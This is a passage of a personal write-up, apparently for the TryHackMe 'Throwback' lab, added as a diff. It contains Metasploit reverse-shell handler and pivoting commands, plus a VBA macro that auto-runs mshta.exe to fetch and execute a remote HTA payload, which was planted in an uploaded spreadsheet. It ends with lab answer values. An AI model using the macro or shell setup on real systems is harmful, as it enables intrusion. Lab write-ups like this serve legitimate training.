@@ -63,3 +63,74 @@ What user was the password reset for?
 ```{toggle}
 MurphyF
 ```
+
+
+
+# Word to your Mother
+
+```bash
+proxychains curl "timekeep.throwback.local/dev/passwordreset.php?user=murphyf&password=PASSWORD"
+
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost tun0
+exploit -j
+
+use post/multi/manage/autoroute
+set session
+set subnet 10.200.102.0
+exploit
+
+use auxiliary/server/socks_proxy
+exploit -j
+
+use exploit/windows/misc/hta_server
+set payload windows/x64/meterpreter/reverse_tcp
+set SRVHOST tun0
+set lhost tun0
+set lport 3333
+set uripath pleasework.hta
+exploit -j
+```
+
+Visual Basic Macro
+
+```vb
+Sub Hello()
+	PID = Shell("mshta.exe http://IP:8080/pleasework.hta")
+End Sub
+	
+Sub Auto_Open()
+	Hello
+End Sub
+```
+
+Turned on Firefox proxy, went to `http://timekeep.throwback.local/` entered murphyf:PASSWORD, uploaded the Timesheet.xlsm. **BUT**
+
+```msconsole
+[*] 10.200.102.176   hta_server - Delivering Payload
+BUT NO shell...
+```
+
+I decided to let it run in the background as maybe it would spawn. I have one day of access left finish Throwback. Deciding that although the support at THM discord is great probably do not have the time to wait. Presuming that most networks don't have nice file upload to RCE and given I have the SQLservice password through proxychain crackmapexec. I read [0xkaram's](https://0xkaram.github.io/posts/Try-Hack-Me-Throwback-Write-Up/#6-throwback-prod--10200154219) I got to the `ipconfig /displaydns`, decide not to break to look up panic and scroll futher.  Here are the asnwers for this section. 
+## Answers
+
+What web server accepts XLSMs as a file upload?
+```{toggle}
+THROWBACK-Time
+```
+What page is the file upload in?  
+```{toggle}
+Timesheet.php
+```
+What is the name of the XLSMs that you can upload?
+```{toggle}
+Timesheet.xlsm
+```
+
+# To be continued...
+
+Due to the fact that my RCE did not land and time, I decided to rush off-piste and try do this from now on off the rails. 
+
+
+
